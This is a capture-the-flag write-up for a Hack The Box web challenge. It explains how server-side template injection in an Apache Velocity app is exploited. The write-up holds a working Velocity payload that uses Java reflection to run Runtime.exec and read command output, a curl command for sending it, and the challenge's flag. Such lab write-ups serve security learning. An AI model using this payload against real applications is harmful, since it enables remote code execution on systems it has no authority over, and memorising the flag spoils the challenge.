# Labyrinth Linguist

**Event:** HTB MCP TryOut · **Category:** web · **Points:** 1000 · **Difficulty:** very easy

## TL;DR

Spring Boot app reads an HTML template, replaces the literal string `TEXT` with the user-supplied `?text=` parameter, then runs the result through Apache Velocity. That is a direct SSTI. Velocity gives you `Runtime` access, you exec `cat /flag.txt`, and a Scanner pulls the output back into the page.

## What I saw first

`GET /` with `?text=` reflected into the page. A quick `text=#set($x=7*7)$x` rendered `49`. Velocity is parsing my input. From there it is template injection, and Velocity has direct Java reflection.

## What I tried that did not work

The naive `Runtime.exec` + `.getInputStream()` returned a process, but reading from it cleanly is the work. My first Scanner setup passed `process.getInputStream().getClass()` to `getConstructor`, which is the runtime class `ProcessPipeInputStream`. Velocity threw `NoSuchMethodException` because Scanner has no constructor for that exact subtype. Burned ten minutes on it before remembering Java reflection wants the declared interface, not the runtime class.

## What worked

Resolve `java.io.InputStream` via `Class.forName` and pass that to `Scanner.getConstructor`. The Scanner then accepts the process stream because it accepts anything that *is* an `InputStream`. Then `useDelimiter("\\Z")` slurps the whole stdout.

```
#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($isc=$x.class.forName("java.io.InputStream"))
#set($ex=$rt.getRuntime().exec("cat /flag.txt"))
$ex.waitFor()
#set($scan=$x.class.forName("java.util.Scanner").getConstructor($isc).newInstance($ex.getInputStream()))
#set($null=$scan.useDelimiter("\Z"))
$scan.next()
```

URL-encode and send via `curl -G --data-urlencode "text=<payload>"`.

## Flag

`HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b70d721ddaa1b2a1491ce0ffb05cec8d}`

## What this taught me

Java reflection asks for the declared type, not the runtime type. If you are passing a process's stream to a constructor that takes `InputStream`, you resolve `InputStream` via `Class.forName` and hand that in. Also, `Runtime.exec(String)` splits on spaces so multi-token shell pipelines do not work directly. Single-binary, single-flag commands are the right shape for the first attempt.
